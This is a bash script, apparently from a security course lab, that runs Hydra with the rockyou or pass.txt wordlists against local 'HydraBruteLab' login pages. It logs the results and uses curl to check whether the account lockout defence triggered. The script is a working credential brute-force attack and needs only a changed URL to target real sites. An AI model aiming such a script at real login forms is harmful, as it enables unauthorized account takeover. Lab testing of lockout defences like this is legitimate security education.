#!/bin/bash

# --- LOGGING SETUP ---
LOGFILE="bruteforce_report.log"
echo "--- NEW SESSION: $(date) ---" >> $LOGFILE

# --- MENU SELECTION ---
echo "------------------------------------------------"
echo "Select the target environment:"
echo "[1] Simple Website"
echo "[2] Advanced Website"
echo "------------------------------------------------"
read -p "Enter your choice [1 or 2]: " choice

if [[ "$choice" == "1" ]]; then
    MODE="SIMPLE"
    URL="http://localhost/HydraBruteLab/simple/login.php"
    WORDLIST="rockyou.txt"
    URL_PATH="/HydraBruteLab/simple/login.php"
elif [[ "$choice" == "2" ]]; then
    MODE="ADVANCED"
    URL="http://localhost/HydraBruteLab/advanced/login.php"
    WORDLIST="pass.txt"
    URL_PATH="/HydraBruteLab/advanced/login.php"
else
    echo "[!] Invalid selection. Exiting."
    exit 1
fi

echo "[*] Target Mode: $MODE" | tee -a $LOGFILE

# --- CONFIGURATION ---
USER="admin@admin.admin"
LOCK_MSG="Account temporary locked"
FAIL_MSG="Wrong password"

if [ ! -f "$WORDLIST" ]; then
    echo "[!] Error: Wordlist '$WORDLIST' not found!" | tee -a $LOGFILE
    exit 1
fi

echo "[*] Starting Attack on: localhost$URL_PATH" | tee -a $LOGFILE

# --- RUN HYDRA ---
# Capture output
OUTPUT=$(hydra -l $USER -P $WORDLIST -t 1 -o /dev/null localhost http-form-post "$URL_PATH:email=^USER^&password=^PASS^&submit=Submit:F=$FAIL_MSG" 2>&1)

# Log the raw Hydra output for the professor
echo "--- Raw Hydra Output ---" >> $LOGFILE
echo "$OUTPUT" >> $LOGFILE
echo "------------------------" >> $LOGFILE

# --- CHECK FOR LOCKOUT ---
TEST_RESP=$(curl -s -d "email=$USER&password=CheckLockStatus&submit=Submit" $URL)

if [[ "$TEST_RESP" == *"$LOCK_MSG"* ]]; then
    RESULT="[!] ALERT: ACCOUNT LOCKED OUT"
    echo "$RESULT" | tee -a $LOGFILE
    echo "Server Response: $LOCK_MSG" >> $LOGFILE
    exit 1
fi

# --- CHECK FOR SUCCESS ---
if echo "$OUTPUT" | grep -q "host: localhost"; then
     PASS_FOUND=$(echo "$OUTPUT" | grep "login:")
     RESULT="[+] SUCCESS: $PASS_FOUND"
     echo "$RESULT" | tee -a $LOGFILE
else
     RESULT="[-] FINISHED: No password found."
     echo "$RESULT" | tee -a $LOGFILE
fi

echo "--- SESSION ENDED ---" >> $LOGFILE